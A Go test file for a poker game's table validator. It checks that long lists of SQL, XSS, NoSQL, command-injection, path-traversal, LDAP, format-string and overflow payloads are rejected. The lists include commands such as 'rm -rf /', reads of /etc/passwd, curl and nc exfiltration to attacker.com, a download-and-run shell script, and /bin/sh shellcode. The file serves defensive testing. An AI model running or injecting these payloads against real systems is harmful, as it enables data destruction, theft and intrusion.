package game

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"testing"
)

// TestAdvancedSQLInjectionExploits tests sophisticated SQL injection attempts
func TestAdvancedSQLInjectionExploits(t *testing.T) {
	manager := NewTableManager(nil)
	validator := NewTableValidator()
	ctx := context.Background()

	// Advanced SQL injection payloads
	sqlInjectionPayloads := []string{
		// Classic SQL injection
		"'; DROP TABLE users; --",
		"'; DELETE FROM tables WHERE 1=1; --",
		"'; INSERT INTO admin VALUES ('hacker', 'password'); --",

		// Union-based injection
		"test' UNION SELECT password FROM users --",
		"table' UNION ALL SELECT NULL,username,password FROM accounts--",

		// Blind SQL injection
		"test'; WAITFOR DELAY '00:00:10'; --",
		"table' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",

		// Boolean-based blind injection
		"test' AND 1=1 --",
		"test' AND 1=2 --",
		"test' OR 'x'='x",
		"test' OR 'x'='y",

		// Time-based blind injection
		"test'; IF (1=1) WAITFOR DELAY '00:00:05' --",
		"test' AND IF(1=1,SLEEP(5),0) --",

		// Advanced obfuscation techniques
		"test/**/UNION/**/SELECT/**/password/**/FROM/**/users",
		"test'+UNION+SELECT+password+FROM+users+--",
		"test%27%20UNION%20SELECT%20password%20FROM%20users%20--%20",

		// Hex encoding
		"test' UNION SELECT 0x70617373776f7264 --",

		// Char-based injection
		"test' UNION SELECT CHAR(112,97,115,115,119,111,114,100) --",

		// Nested queries
		"test' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT((SELECT password FROM users),FLOOR(RAND(0)*2))) --",

		// Error-based injection
		"test' AND extractvalue(1, concat(0x7e, (SELECT password FROM users), 0x7e)) --",
		"test' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",

		// Second-order injection
		"admin'/*",
		"*/; DROP TABLE users; --",

		// Multi-statement injection
		"test'; CREATE TABLE temp AS SELECT * FROM users; DROP TABLE users; --",
	}

	// Test all payloads
	for i, payload := range sqlInjectionPayloads {
		t.Run(fmt.Sprintf("SQLInjection_%d", i), func(t *testing.T) {
			// Test table name injection
			err := validator.ValidateTableName(payload)
			if err == nil {
				t.Errorf("SQL injection payload should be blocked: %s", payload)
			}

			// Test description injection
			err = validator.ValidateDescription(payload)
			if err == nil {
				t.Errorf("SQL injection in description should be blocked: %s", payload)
			}

			// Test full table creation with injection
			req := &TableCreateRequest{
				Name:        payload,
				GameType:    GameTypeTexasHoldem,
				CreatedBy:   "attacker",
				Username:    "Attacker",
				Settings:    DefaultTableSettings(),
				Description: payload,
				Tags:        []string{payload},
			}

			_, err = manager.CreateTable(ctx, req)
			if err == nil {
				t.Errorf("Table creation with SQL injection should fail: %s", payload)
			}
		})
	}
}

// TestAdvancedXSSExploits tests sophisticated XSS attempts
func TestAdvancedXSSExploits(t *testing.T) {
	manager := NewTableManager(nil)
	validator := NewTableValidator()
	ctx := context.Background()

	// Advanced XSS payloads
	xssPayloads := []string{
		// Basic XSS
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",

		// Event handler XSS
		"<body onload=alert('XSS')>",
		"<input type=\"text\" onkeypress=\"alert('XSS')\">",
		"<div onclick=\"alert('XSS')\">Click me</div>",

		// JavaScript: URL XSS
		"<a href=\"javascript:alert('XSS')\">Click</a>",
		"<iframe src=\"javascript:alert('XSS')\"></iframe>",

		// Data: URL XSS
		"<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
		"<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>",

		// Filter bypass techniques
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		"<scr<script>ipt>alert('XSS')</scr</script>ipt>",
		"<ScRiPt>alert('XSS')</ScRiPt>",
		"<script>alert('XSS');</script>",

		// Encoded XSS
		"&lt;script&gt;alert('XSS')&lt;/script&gt;",
		"%3Cscript%3Ealert('XSS')%3C/script%3E",
		"&#60;script&#62;alert('XSS')&#60;/script&#62;",

		// HTML entity encoding
		"&lt;img src=x onerror=alert('XSS')&gt;",
		"&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",

		// Unicode encoding
		"<script>alert('\\u0058\\u0053\\u0053')</script>",
		"\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",

		// CSS-based XSS
		"<style>@import'javascript:alert(\"XSS\")';</style>",
		"<div style=\"background:url(javascript:alert('XSS'))\">",

		// SVG-based XSS
		"<svg><script>alert('XSS')</script></svg>",
		"<svg onload=\"alert('XSS')\"></svg>",

		// Form-based XSS
		"<form><button formaction=\"javascript:alert('XSS')\">Submit</button></form>",
		"<input type=\"submit\" formaction=\"javascript:alert('XSS')\" value=\"Submit\">",

		// Meta refresh XSS
		"<meta http-equiv=\"refresh\" content=\"0;javascript:alert('XSS')\">",

		// Base tag XSS
		"<base href=\"javascript:alert('XSS');//\">",

		// Template injection
		"{{constructor.constructor('alert(\\\"XSS\\\")')()}}",
		"${alert('XSS')}",
		"<%= alert('XSS') %>",

		// AngularJS XSS
		"{{constructor.constructor('alert(1)')()}}",
		"<div ng-app ng-csp ng-click=\"$event.view.alert('XSS')\">Click</div>",

		// VBScript XSS
		"<script language=\"vbscript\">alert(\"XSS\")</script>",

		// Expression XSS
		"<div style=\"width: expression(alert('XSS'));\">",
	}

	// Test all XSS payloads
	for i, payload := range xssPayloads {
		t.Run(fmt.Sprintf("XSS_%d", i), func(t *testing.T) {
			// Test table name XSS
			err := validator.ValidateTableName(payload)
			if err == nil {
				t.Errorf("XSS payload should be blocked in table name: %s", payload)
			}

			// Test description XSS - only expect blocking if it contains dangerous patterns
			// Pre-encoded HTML entities are actually safe and should be allowed
			isPreEncoded := strings.Contains(payload, "&lt;") ||
				strings.Contains(payload, "&#") ||
				(strings.Contains(payload, "ng-") && !strings.Contains(payload, "<script") && !strings.Contains(payload, "javascript:"))

			err = validator.ValidateDescription(payload)
			if !isPreEncoded && err == nil {
				t.Errorf("XSS payload should be blocked in description: %s", payload)
			}

			// Test username XSS
			err = validator.ValidateUsername(strings.ReplaceAll(payload, " ", ""))
			if err == nil && len(strings.ReplaceAll(payload, " ", "")) >= 3 {
				t.Errorf("XSS payload should be blocked in username: %s", payload)
			}

			// Test full table creation with XSS
			req := &TableCreateRequest{
				Name:        "Safe Name",
				GameType:    GameTypeTexasHoldem,
				CreatedBy:   "attacker",
				Username:    "Attacker",
				Settings:    DefaultTableSettings(),
				Description: payload,
			}

			table, err := manager.CreateTable(ctx, req)
			if err == nil {
				// If creation succeeded, ensure the payload was sanitized
				if strings.Contains(table.Description, "<script>") ||
					strings.Contains(table.Description, "javascript:") ||
					strings.Contains(table.Description, "onerror=") {
					t.Errorf("XSS payload was not properly sanitized: %s -> %s", payload, table.Description)
				}
			}
		})
	}
}

// TestNoSQLInjectionExploits tests NoSQL injection attempts
func TestNoSQLInjectionExploits(t *testing.T) {
	validator := NewTableValidator()

	// NoSQL injection payloads
	noSQLPayloads := []string{
		// MongoDB injection
		"'; return true; var x = '",
		"' || '1'=='1",
		"'; return db.users.find(); var x = '",
		"$where: function() { return true; }",
		"{$gt: ''}",
		"{$ne: null}",
		"{$regex: '.*'}",

		// JavaScript injection in MongoDB
		"'; while(true){}; var x = '",
		"'; db.dropDatabase(); var x = '",
		"'; db.users.drop(); var x = '",

		// JSON injection
		"\"; return true; //",
		"\\\"; return true; //",

		// CouchDB injection
		"'; emit(null, null); var x = '",
		"function(){emit(null,null)}",

		// ElasticSearch injection
		"{\"script\": \"java.lang.Math.class\"}",
		"{\"script\": {\"source\": \"while(true){}\", \"lang\": \"painless\"}}",
	}

	for i, payload := range noSQLPayloads {
		t.Run(fmt.Sprintf("NoSQL_%d", i), func(t *testing.T) {
			err := validator.ValidateTableName(payload)
			if err == nil {
				t.Errorf("NoSQL injection payload should be blocked: %s", payload)
			}

			err = validator.ValidateDescription(payload)
			if err == nil {
				t.Errorf("NoSQL injection payload should be blocked in description: %s", payload)
			}
		})
	}
}

// TestCommandInjectionExploits tests command injection attempts
func TestCommandInjectionExploits(t *testing.T) {
	validator := NewTableValidator()

	// Command injection payloads
	commandPayloads := []string{
		// Basic command injection
		"; ls -la",
		"| cat /etc/passwd",
		"& whoami",
		"&& rm -rf /",
		"|| echo 'hacked'",

		// Windows command injection
		"; dir",
		"| type C:\\Windows\\System32\\drivers\\etc\\hosts",
		"& echo hacked",
		"&& del /F /Q C:\\*.*",

		// Backtick injection
		"`ls -la`",
		"`cat /etc/passwd`",
		"`whoami`",

		// $() injection
		"$(ls -la)",
		"$(cat /etc/passwd)",
		"$(rm -rf /)",

		// Pipe injection
		"| nc attacker.com 80",
		"| curl attacker.com/steal?data=",

		// Redirection injection
		"; echo hacked > /tmp/pwned",
		"; cat /etc/passwd > /tmp/dump",

		// Advanced payloads
		"; wget http://attacker.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh",
		"; python -c \"import os; os.system('rm -rf /')\"",
		"; perl -e \"system('rm -rf /')\"",

		// Encoded payloads
		"; %63%61%74%20%2F%65%74%63%2F%70%61%73%73%77%64", // cat /etc/passwd
		"; \\x63\\x61\\x74\\x20\\x2F\\x65\\x74\\x63\\x2F\\x70\\x61\\x73\\x73\\x77\\x64",
	}

	for i, payload := range commandPayloads {
		t.Run(fmt.Sprintf("Command_%d", i), func(t *testing.T) {
			err := validator.ValidateTableName(payload)
			if err == nil {
				t.Errorf("Command injection payload should be blocked: %s", payload)
			}

			err = validator.ValidateDescription(payload)
			if err == nil {
				t.Errorf("Command injection payload should be blocked in description: %s", payload)
			}
		})
	}
}

// TestPathTraversalExploits tests path traversal attempts
func TestPathTraversalExploits(t *testing.T) {
	validator := NewTableValidator()

	// Path traversal payloads
	pathPayloads := []string{
		// Basic path traversal
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",

		// Double encoding
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",

		// Unicode encoding
		"..%u002F..%u002F..%u002Fetc%u002Fpasswd",
		"..\\u002E\\u002E\\u002Fetc\\u002Fpasswd",

		// Null byte injection
		"../../../etc/passwd%00.txt",
		"../../../etc/passwd\x00.jpg",

		// Long path names
		strings.Repeat("../", 100) + "etc/passwd",
		strings.Repeat("..\\", 100) + "windows\\system32\\config\\sam",

		// Alternative separators
		"..;/..;/..;/etc/passwd",
		"../;../;../;etc/passwd",

		// UNC paths (Windows)
		"\\\\127.0.0.1\\share\\file",
		"\\\\localhost\\c$\\windows\\system32\\config\\sam",

		// Various file extensions
		"../../../etc/passwd.txt",
		"../../../boot.ini",
		"../../../etc/shadow",
		"../../../proc/self/environ",
	}

	for i, payload := range pathPayloads {
		t.Run(fmt.Sprintf("Path_%d", i), func(t *testing.T) {
			err := validator.ValidateTableName(payload)
			if err == nil {
				t.Errorf("Path traversal payload should be blocked: %s", payload)
			}

			err = validator.ValidateDescription(payload)
			if err == nil {
				t.Errorf("Path traversal payload should be blocked in description: %s", payload)
			}
		})
	}
}

// TestLDAPInjectionExploits tests LDAP injection attempts
func TestLDAPInjectionExploits(t *testing.T) {
	validator := NewTableValidator()

	// LDAP injection payloads
	ldapPayloads := []string{
		// Basic LDAP injection
		"*)(uid=*))(|(uid=*",
		"*)(|(password=*))",
		"admin)(&(password=*)",

		// Blind LDAP injection
		"*)(objectClass=*",
		"admin))(|(objectClass=*",

		// Time-based LDAP injection
		"admin)(&(|(objectClass=*)(objectClass=*))(objectClass=*",

		// LDAP filter bypass
		"*)((|(*)(password=*))",
		"*))%00",

		// Unicode LDAP injection
		"\\2A\\29\\28\\75\\69\\64\\3D\\2A",

		// Boolean LDAP injection
		"admin)(&(objectClass=user)(password=*))",
		"user*)(|(password=*))(objectClass=*",
	}

	for i, payload := range ldapPayloads {
		t.Run(fmt.Sprintf("LDAP_%d", i), func(t *testing.T) {
			err := validator.ValidateUsername(payload)
			if err == nil && len(payload) >= 3 && len(payload) <= 30 {
				t.Errorf("LDAP injection payload should be blocked: %s", payload)
			}

			err = validator.ValidateDescription(payload)
			if err == nil {
				t.Errorf("LDAP injection payload should be blocked in description: %s", payload)
			}
		})
	}
}

// TestFormatStringExploits tests format string vulnerabilities
func TestFormatStringExploits(t *testing.T) {
	validator := NewTableValidator()

	// Format string payloads
	formatPayloads := []string{
		// Basic format string
		"%s%s%s%s%s%s%s%s%s%s",
		"%x%x%x%x%x%x%x%x%x%x",
		"%n%n%n%n%n%n%n%n%n%n",

		// Advanced format string
		"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x",
		"AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x",

		// Direct parameter access
		"%7$s",
		"%7$x",
		"%7$n",

		// Width and precision
		"%.1000000s",
		"%1000000s",
		"%.*s",

		// Long format strings
		strings.Repeat("%s", 100),
		strings.Repeat("%x", 100),
		strings.Repeat("%n", 100),

		// Mixed format strings
		"%s%x%n%d%f%c%p",
	}

	for i, payload := range formatPayloads {
		t.Run(fmt.Sprintf("Format_%d", i), func(t *testing.T) {
			err := validator.ValidateTableName(payload)
			if err == nil {
				t.Errorf("Format string payload should be blocked: %s", payload)
			}

			err = validator.ValidateDescription(payload)
			if err == nil {
				t.Errorf("Format string payload should be blocked in description: %s", payload)
			}
		})
	}
}

// TestBufferOverflowExploits tests buffer overflow attempts
func TestBufferOverflowExploits(t *testing.T) {
	validator := NewTableValidator()

	// Buffer overflow payloads
	overflowPayloads := []string{
		// Simple buffer overflow
		strings.Repeat("A", 10000),
		strings.Repeat("B", 100000),
		strings.Repeat("\\x41", 5000),

		// Shellcode patterns
		"\\x90\\x90\\x90\\x90\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80",
		strings.Repeat("\\x90", 1000) + "\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80",

		// Return address overwrite patterns
		"AAAA" + strings.Repeat("\\x41\\x41\\x41\\x41", 100),
		strings.Repeat("AAAA", 1000) + "\\x08\\x04\\x05\\x06",

		// Format string buffer overflow
		strings.Repeat("%s", 10000),
		strings.Repeat("%.10000s", 100),

		// Unicode buffer overflow
		strings.Repeat("\\u0041", 10000),
		strings.Repeat("𝓐", 10000), // Unicode mathematical script capital A

		// Different character sets
		strings.Repeat("©", 10000),
		strings.Repeat("🚀", 5000),
	}

	for i, payload := range overflowPayloads {
		t.Run(fmt.Sprintf("Overflow_%d", i), func(t *testing.T) {
			err := validator.ValidateTableName(payload)
			if err == nil {
				t.Errorf("Buffer overflow payload should be blocked due to length: %d chars", len(payload))
			}

			err = validator.ValidateDescription(payload)
			if err == nil {
				t.Errorf("Buffer overflow payload should be blocked in description due to length: %d chars", len(payload))
			}
		})
	}
}

// TestConcurrentExploitAttempts tests concurrent malicious operations
func TestConcurrentExploitAttempts(t *testing.T) {
	manager := NewTableManager(nil)
	ctx := context.Background()

	// Malicious payloads to test concurrently
	maliciousPayloads := []string{
		"'; DROP TABLE users; --",
		"<script>alert('XSS')</script>",
		strings.Repeat("A", 10000),
		"${alert('XSS')}",
		"../../../etc/passwd",
		"*)(uid=*))(|(uid=*",
	}

	var wg sync.WaitGroup
	errorChan := make(chan error, len(maliciousPayloads)*10)

	// Launch concurrent attacks
	for i := 0; i < 10; i++ {
		for j, payload := range maliciousPayloads {
			wg.Add(1)
			go func(iteration int, payloadIndex int, maliciousInput string) {
				defer wg.Done()

				req := &TableCreateRequest{
					Name:        fmt.Sprintf("Attack_%d_%d_%s", iteration, payloadIndex, maliciousInput[:minInt(10, len(maliciousInput))]),
					GameType:    GameTypeTexasHoldem,
					CreatedBy:   fmt.Sprintf("attacker_%d", iteration),
					Username:    fmt.Sprintf("Attacker%d", iteration),
					Settings:    DefaultTableSettings(),
					Description: maliciousInput,
				}

				_, err := manager.CreateTable(ctx, req)
				errorChan <- err
			}(i, j, payload)
		}
	}

	wg.Wait()
	close(errorChan)

	// All attacks should be blocked
	successfulAttacks := 0
	for err := range errorChan {
		if err == nil {
			successfulAttacks++
		}
	}

	if successfulAttacks > 0 {
		t.Errorf("Expected all concurrent attacks to be blocked, but %d succeeded", successfulAttacks)
	}
}

// minInt returns the smaller of two integers
func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
